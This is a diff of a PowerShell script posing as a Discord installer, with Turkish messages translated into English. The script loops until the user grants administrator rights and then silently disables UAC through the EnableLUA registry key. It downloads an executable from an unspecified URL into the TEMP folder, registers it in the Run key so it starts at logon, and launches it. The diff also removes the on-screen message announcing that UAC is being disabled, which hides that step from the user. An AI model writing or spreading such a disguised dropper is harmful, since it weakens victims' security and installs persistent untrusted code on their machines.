@@ -1,27 +1,19 @@
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$isHidden = $env:HIDDEN -eq '1'
 
 if (-not $isAdmin) {
     while ($true) {
-        Write-Host "Yonetici izni gerekiyor!"
-        $confirm = Read-Host "Yonetici olarak calistirmak icin (E/H)?"
-        if ($confirm -eq 'E' -or $confirm -eq 'e') {
+        Write-Host "Administrator permission is required!"
+        $confirm = Read-Host "To run as administrator, please enter (Y/N):"
+        if ($confirm -eq 'Y' -or $confirm -eq 'y') {
             Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
             exit
         }
-        Write-Host "Evet demediniz. Tekrar soruluyor..."
+        Write-Host "You didn’t click Yes. It is being asked again..."
         Start-Sleep -Seconds 1
     }
 }
 
-if (-not $isHidden) {
-    $env:HIDDEN = "1"
-    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -WindowStyle Hidden
-    exit
-}
-
-Write-Host "Discord kurulumu basliyor..."
-Write-Host "UAC devre disi birakiliyor..."
+Write-Host "Discord installation is starting..."
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0 | Out-Null
 
@@ -32,26 +24,23 @@ $TempPath = $env:TEMP
 $FilePath = Join-Path $TempPath 'discord.exe'
 
 if (Test-Path $FilePath) {
-    Write-Host "Discord zaten mevcut! Kurulum atlaniyor."
+    Write-Host "Discord is already installed! Skipping installation."
     exit
 }
 
-Write-Host "Indiriliyor: $DownloadURL"
+Write-Host "Downloading: $DownloadURL"
 
 try {
     Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
-    Write-Host "Indirme tamamlandi: $FilePath"
-    
-    Write-Host "Registry'e ekleniyor..."
+    Write-Host "Download completed: $FilePath"
     reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "DiscordSetup" /t REG_SZ /d "`"$FilePath`"" /f | Out-Null
-    Write-Host "Baslangica eklendi"
     
-    Write-Host "Kurulum baslatiliyor..."
+    Write-Host "Starting installation..."
     Start-Process -FilePath $FilePath -Wait
-    Write-Host "Kurulum tamamlandi!"
+    Write-Host "Installation completed!"
 } catch {
-    Write-Host "Hata: $_"
+    Write-Host "Error: $_"
 }
 
-Write-Host "Islem tamamlandi."
-Read-Host "Cikmak icin Enter'a bas..."
+Write-Host "Process completed."
+Read-Host "Press Enter to exit..."
